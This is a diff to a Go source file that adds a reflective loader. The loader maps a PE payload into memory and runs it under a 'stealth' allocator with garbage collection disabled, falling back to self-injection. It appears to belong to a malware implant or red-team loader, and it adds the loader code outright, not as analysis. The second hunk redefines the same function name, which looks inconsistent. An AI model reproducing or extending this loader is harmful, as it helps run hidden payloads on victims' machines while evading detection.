@@ -41,6 +41,23 @@ func executeStealthLoader(payload []byte) {
 	runtime.KeepAlive(pinned)
 }
 
+func executeReflectiveLoader(payload []byte) {
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+	prevGC := debug.SetGCPercent(-1)
+	defer debug.SetGCPercent(prevGC)
+	pinned := append([]byte(nil), payload...)
+	stealthAllocator = true
+	defer func() { stealthAllocator = false }()
+	img, ok := selfMapImage(pinned)
+	if !ok {
+		executeSelfInjection(payload)
+		return
+	}
+	selfRunImageStealth(img)
+	runtime.KeepAlive(pinned)
+}
+
 func selfMapImage(payload []byte) (*selfImage, bool) {
 	if len(payload) < 0x1000 || payload[0] != 'M' || payload[1] != 'Z' {
 		return nil, false
@@ -388,6 +405,10 @@ func executeStealthLoader(payload []byte) {
 	}
 	selfRunImageStealth32(img)
 	runtime.KeepAlive(pinned)
+}
+
+func executeReflectiveLoader(payload []byte) {
+	executeSelfInjection(payload)
 }
 
 func selfMapImage32(payload []byte) (*selfImage32, bool) {
